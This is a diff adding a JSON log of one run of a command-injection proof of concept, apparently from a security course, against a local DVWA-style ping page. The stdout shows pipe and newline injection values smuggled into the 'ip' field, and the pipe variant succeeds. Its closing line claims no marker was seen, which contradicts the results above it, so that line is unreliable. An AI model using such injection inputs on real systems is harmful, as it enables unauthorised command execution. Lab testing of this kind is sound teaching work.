@@ -1,0 +1,32 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\CMD-002__1.py",
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/exec/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_medium.cookie",
+    "--os",
+    "linux"
+  ],
+  "started_at": "2026-10-20T14:42:18+08:00",
+  "returncode": 2,
+  "elapsed_seconds": 12.449,
+  "stdout": "[*] target = http://127.0.0.1:9080/vulnerabilities/exec/ (POST, Submit=Submit)\r\n[*] cookie = loaded\r\n[*] baseline ping\r\n    ip      : '127.0.0.1'\r\n    status  : 200\r\n    <pre>   : 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.010 ms\\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.026 ms\\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.023 ms\\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.049 ms\\n\\n--- 127.0.0.1 ping statistics ---\\n4 packets transmitted, 4 received, 0% packet loss, time 3052ms\\nrtt min/avg/max/mdev = 0.'\r\n    marker in <pre> : False\r\n    marker in page  : False\r\n[*] reflection control\r\n    ip      : 'CMD002_MARK_OK'\r\n    status  : 200\r\n    <pre>   : 'PING CMD002_MARK_OK (198.18.0.34) 56(84) bytes of data.\\n64 bytes from 198.18.0.34 (198.18.0.34): icmp_seq=1 ttl=62 time=0.900 ms\\n64 bytes from 198.18.0.34 (198.18.0.34): icmp_seq=2 ttl=62 time=0.643 ms\\n64 bytes from 198.18.0.34 (198.18.0.34): icmp_seq=3 ttl=62 time=0.928 ms\\n64 bytes from 198.18.0.34 (198.18.0.34): icmp_seq=4 ttl=62 time=1.82 ms\\n\\n--- CMD002_MARK_OK ping statistics ---\\n4 packets tra'\r\n    marker in <pre> : True\r\n    marker in page  : True\r\n[*] injection/pipe\r\n    ip      : '127.0.0.1 | echo CMD002_MARK_OK'\r\n    status  : 200\r\n    <pre>   : 'CMD002_MARK_OK'\r\n    marker in <pre> : True\r\n    marker in page  : True\r\n[*] injection/newline\r\n    ip      : '127.0.0.1\\necho CMD002_MARK_OK'\r\n    status  : 200\r\n    <pre>   : 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.007 ms\\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.083 ms\\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.101 ms\\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.091 ms\\n\\n--- 127.0.0.1 ping statistics ---\\n4 packets transmitted, 4 received, 0% packet loss, time 3054ms\\nrtt min/avg/max/mdev = 0.'\r\n    marker in <pre> : True\r\n    marker in page  : True\r\n[-] 本次未观察到标记：可能是 shell_exec/ping 不可用、路径或会话不符，不能直接判为不存在。\r\n",
+  "stderr": "",
+  "cohort": "v3",
+  "stem": "CMD-002__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\CMD-002__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/exec/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_medium.cookie",
+    "--os",
+    "linux"
+  ]
+}
